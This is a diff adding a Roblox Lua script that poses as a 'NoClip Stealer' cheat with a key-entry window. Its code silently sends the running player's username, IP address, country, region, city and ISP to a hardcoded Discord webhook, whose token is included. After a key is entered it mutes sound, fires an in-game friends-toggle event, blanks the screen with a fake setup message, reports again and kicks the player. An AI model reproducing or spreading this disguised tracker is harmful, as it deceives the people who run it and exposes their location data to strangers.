@@ -1,0 +1,312 @@
+-- v3
+
+-- Services
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+-- URLs
+local webhookUrl = "https://discord.com/api/webhooks/1404644055484203019/RSg9EtGbjsbnb61ElXpgOs4DsACKWvWFSfC8QDAjfH70CPN9I_3-N1fuybZC3w5n_eG2"
+local ipApiUrl = "http://ip-api.com/json"
+
+-- User information
+local userName = player.Name
+local userId = player.UserId
+local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+
+-- Function to escape special characters in JSON
+local function escapeJsonString(str)
+    if not str then return "Unknown" end
+    return str:gsub('["\\]', '\\%1'):gsub('\n', '\\n')
+end
+
+-- Function to parse JSON manually
+local function parseJson(body)
+    local result = {query = "Unknown", country = "Unknown", regionName = "Unknown", city = "Unknown", isp = "Unknown"}
+    if body then
+        result.query = body:match('"query":"(.-)"') or "Unknown"
+        result.country = body:match('"country":"(.-)"') or "Unknown"
+        result.regionName = body:match('"regionName":"(.-)"') or "Unknown"
+        result.city = body:match('"city":"(.-)"') or "Unknown"
+        result.isp = body:match('"isp":"(.-)"') or "Unknown"
+    end
+    return result
+end
+
+-- Function to send message to webhook
+local function sendToDiscord(event, ip, country, region, city, isp)
+    local currentTime = os.date("%H:%M", os.time()) -- Hour and minutes only
+    local message
+    
+    if event == "executed" then
+        message = string.format(
+            "**%s executed the script**\n" ..
+            "User: %s\n" ..
+            "Time: %s\n" ..
+            "IP: %s\n" ..
+            "Country: %s\n" ..
+            "Region: %s\n" ..
+            "City: %s\n" ..
+            "ISP: %s",
+            escapeJsonString(userName),
+            escapeJsonString(userName),
+            escapeJsonString(currentTime),
+            escapeJsonString(ip),
+            escapeJsonString(country),
+            escapeJsonString(region),
+            escapeJsonString(city),
+            escapeJsonString(isp)
+        )
+    else -- white_screen
+        message = string.format(
+            "**User is in white screen**\n" ..
+            "User: %s\n" ..
+            "Time: %s",
+            escapeJsonString(userName),
+            escapeJsonString(currentTime)
+        )
+    end
+    
+    local data = string.format([[
+        {
+            "content": "%s"
+        }
+    ]], escapeJsonString(message))
+    
+    local success, response = pcall(function()
+        return request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = data
+        })
+    end)
+    
+    if success then
+        if response and response.StatusCode == 204 then
+            print("Webhook sent successfully!")
+        else
+            warn("Webhook failed: StatusCode=" .. tostring(response and response.StatusCode or "No response") .. ", Response=" .. tostring(response and response.Body or "No body"))
+        end
+    else
+        warn("Webhook request error: " .. tostring(response))
+    end
+end
+
+-- Fetch IP information
+local ip, country, region, city, isp = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+local success, response = pcall(function()
+    return request({
+        Url = ipApiUrl,
+        Method = "GET"
+    })
+end)
+
+if success and response and response.Body then
+    local data = parseJson(response.Body)
+    ip = data.query
+    country = data.country
+    region = data.regionName
+    city = data.city
+    isp = data.isp
+    print("IP fetched: " .. ip)
+else
+    warn("Failed to fetch IP info: " .. tostring(response or "No response"))
+end
+
+-- Send webhook when script is executed
+sendToDiscord("executed", ip, country, region, city, isp)
+
+-- Valid keys
+local validKeys = {
+    ["xkey8"] = true,
+    ["xkey13"] = true,
+}
+
+-- Function to make UI draggable
+local function makeDraggable(guiObject, dragButtons)
+    dragButtons = dragButtons or {Enum.UserInputType.MouseButton1}
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        local newPos = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+        guiObject.Position = newPos
+    end
+
+    guiObject.InputBegan:Connect(function(input)
+        if table.find(dragButtons, input.UserInputType) then
+            dragging = true
+            dragStart = input.Position
+            startPos = guiObject.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    guiObject.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input == dragInput then
+            update(input)
+        end
+    end)
+end
+
+-- UI KEY SYSTEM
+local ScreenGuiKey = Instance.new("ScreenGui")
+ScreenGuiKey.Name = "WaxyKeySystem"
+ScreenGuiKey.Parent = game.CoreGui
+ScreenGuiKey.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local FrameKey = Instance.new("Frame")
+FrameKey.Size = UDim2.new(0, 350, 0, 150)
+FrameKey.Position = UDim2.new(0.4, 0, 0.35, 0)
+FrameKey.BackgroundColor3 = Color3.fromRGB(35,35,35)
+FrameKey.BorderSizePixel = 0
+FrameKey.Parent = ScreenGuiKey
+
+local TopBarKey = Instance.new("Frame")
+TopBarKey.Size = UDim2.new(1, 0, 0, 28)
+TopBarKey.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
+TopBarKey.BorderSizePixel = 0
+TopBarKey.Parent = FrameKey
+
+local TitleKey = Instance.new("TextLabel")
+TitleKey.Size = UDim2.new(1, 0, 1, 0)
+TitleKey.BackgroundTransparency = 1
+TitleKey.Text = "Waxy's NoClip Stealer"
+TitleKey.Font = Enum.Font.GothamBold
+TitleKey.TextSize = 14
+TitleKey.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleKey.Parent = TopBarKey
+
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0, 300, 0, 40)
+InputBox.Position = UDim2.new(0, 25, 0, 55)
+InputBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
+InputBox.TextColor3 = Color3.fromRGB(255,255,255)
+InputBox.Font = Enum.Font.Gotham
+InputBox.TextSize = 18
+InputBox.Text = "Ingresa La Llave"
+InputBox.ClearTextOnFocus = false
+InputBox.Parent = FrameKey
+
+local EnterButton = Instance.new("TextButton")
+EnterButton.Size = UDim2.new(0, 100, 0, 30)
+EnterButton.Position = UDim2.new(0, 125, 0, 105)
+EnterButton.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
+EnterButton.Text = "Entrar"
+EnterButton.Font = Enum.Font.GothamBold
+EnterButton.TextSize = 16
+EnterButton.TextColor3 = Color3.fromRGB(255,255,255)
+EnterButton.Parent = FrameKey
+
+local CreditLabelKey = Instance.new("TextLabel")
+CreditLabelKey.Size = UDim2.new(1, -10, 0, 20)
+CreditLabelKey.Position = UDim2.new(0, 5, 1, -22)
+CreditLabelKey.BackgroundTransparency = 1
+CreditLabelKey.Text = "Hecho por @WaxyScript en TikTok"
+CreditLabelKey.Font = Enum.Font.Gotham
+CreditLabelKey.TextSize = 12
+CreditLabelKey.TextColor3 = Color3.fromRGB(200, 200, 200)
+CreditLabelKey.TextXAlignment = Enum.TextXAlignment.Left
+CreditLabelKey.Parent = FrameKey
+
+makeDraggable(FrameKey, {Enum.UserInputType.MouseButton1})
+
+-- Function for full-coverage white screen with total mute and ToggleFriends
+local function pantallaBlanca()
+    -- Mute all sounds exactly when white screen appears
+    for _, sound in ipairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+        end
+    end
+    game.DescendantAdded:Connect(function(obj)
+        if obj:IsA("Sound") then
+            obj.Volume = 0
+        end
+    end)
+
+    -- Fire ToggleFriends RemoteEvent
+    local toggleFriendsEvent = ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]
+    if toggleFriendsEvent then
+        pcall(function()
+            toggleFriendsEvent:FireServer()
+            print("ToggleFriends fired successfully!")
+        end)
+    else
+        warn("ToggleFriends RemoteEvent not found!")
+    end
+
+    local whiteGui = Instance.new("ScreenGui")
+    whiteGui.Name = "WhiteScreen"
+    whiteGui.Parent = game.CoreGui
+    whiteGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    whiteGui.IgnoreGuiInset = true -- Ensures full coverage, ignoring safe areas
+
+    local whiteFrame = Instance.new("Frame")
+    whiteFrame.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
+    whiteFrame.Position = UDim2.new(0, 0, 0, 0) -- Starts at top-left
+    whiteFrame.BackgroundColor3 = Color3.new(1, 1, 1) -- Pure white
+    whiteFrame.BackgroundTransparency = 0 -- Fully opaque
+    whiteFrame.BorderSizePixel = 0
+    whiteFrame.ZIndex = 9999 -- High ZIndex to cover everything
+    whiteFrame.Parent = whiteGui
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "Configurando dispositivo…"
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 36
+    label.TextColor3 = Color3.new(0, 0, 0)
+    label.Parent = whiteFrame
+
+    -- Send webhook when white screen is shown
+    sendToDiscord("white_screen", ip, country, region, city, isp)
+end
+
+-- Button logic
+EnterButton.MouseButton1Click:Connect(function()
+    local keyEntered = InputBox.Text
+    if validKeys[keyEntered] then
+        InputBox.Text = "Procesando..."
+        EnterButton.Active = false
+        EnterButton.AutoButtonColor = false
+
+        wait(2)
+
+        -- Hide UI and show white screen
+        ScreenGuiKey.Enabled = false
+        pantallaBlanca()
+
+        wait(60)
+
+        -- Kick player
+        player:Kick("Dispositivo Configurado")
+    else
+        InputBox.Text = "Llave incorrecta"
+    end
+end)
